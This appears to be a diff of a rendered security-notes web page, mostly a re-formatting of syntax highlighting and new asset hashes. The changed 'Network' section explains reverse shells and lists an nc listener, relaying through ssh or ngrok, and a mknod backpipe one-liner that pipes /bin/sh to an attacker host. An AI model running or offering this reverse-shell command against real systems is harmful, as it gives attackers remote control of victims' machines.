@@ -11,7 +11,7 @@
   <link href="/css/style-classic.css"></link>
   
   
-  <link rel="stylesheet" href="/css/style.min.66ce8fff03ef375318be5d54765d5c0749bf4b361552834de057ae7105ddb079.css">
+  <link rel="stylesheet" href="/css/style.min.957e71ad2cb873132802e19798d6ca577b82e708fa80d1e90b00bc9e23855023.css">
   
 
   
@@ -248,15 +248,15 @@
     <h2 id="network">Network</h2>
 <p>You will need pcap files for that: <a href="https://www.activecountermeasures.com/free-tools/rita/">https://www.activecountermeasures.com/free-tools/rita/</a>.
 Forward: attacker connects to the victim. Reverse: victim connects to the attacker (harder to detect). Usually, ingress traffic is highly restrictive, unlike the egress one. That&rsquo;s why it&rsquo;s stealthier to use a reverse shell.</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># On attacker&#39;s machine</span>
-nc -l <span class="m">1234</span> <span class="c1"># open the listener (attacker&#39;s machine)</span>
-<span class="c1"># optionally relay this listener to another service.</span>
-ssh -R 1234:localhost:1234 relay@relay <span class="c1"># or..</span>
-ngrok tcp <span class="m">1234</span>
-
-<span class="c1"># On the victim&#39;s machine (most likely, remotely)</span>
-mknod /tmp/backpipe p<span class="p">;</span> /bin/sh 0&lt;/tmp/backpipe <span class="p">|</span> nc attackerspublicIP <span class="m">1234</span> 1&gt;/tmp/backpipe
-</code></pre></div><h2 id="elastic">Elastic</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># On attacker&#39;s machine</span>
+</span></span><span class="line"><span class="cl">nc -l <span class="m">1234</span> <span class="c1"># open the listener (attacker&#39;s machine)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># optionally relay this listener to another service.</span>
+</span></span><span class="line"><span class="cl">ssh -R 1234:localhost:1234 relay@relay <span class="c1"># or..</span>
+</span></span><span class="line"><span class="cl">ngrok tcp <span class="m">1234</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># On the victim&#39;s machine (most likely, remotely)</span>
+</span></span><span class="line"><span class="cl">mknod /tmp/backpipe p<span class="p">;</span> /bin/sh 0&lt;/tmp/backpipe <span class="p">|</span> nc attackerspublicIP <span class="m">1234</span> 1&gt;/tmp/backpipe
+</span></span></code></pre></div><h2 id="elastic">Elastic</h2>
 <h2 id="toolkit">Toolkit</h2>
 <h3 id="ngrok">ngrok</h3>
 <p>Exposes the port to the interenet. Used when IP is private.</p>
@@ -292,7 +292,7 @@ mknod /tmp/backpipe p<span class="p">;</span> /bin/sh 0&lt;/tmp/backpipe <span c
   
 
   
-  <script type="text/javascript" src="/js/scripts.min.1237ff71925bb8625c97a9af8db4c54525258bedfd7c47493daaff723bea755e.js"></script>
+  <script type="text/javascript" src="/js/scripts.min.bafc052229b4b40bf03c477d31c5cdd9352ece8afbadf35ab97ed14495098fc9.js"></script>
   
 
   
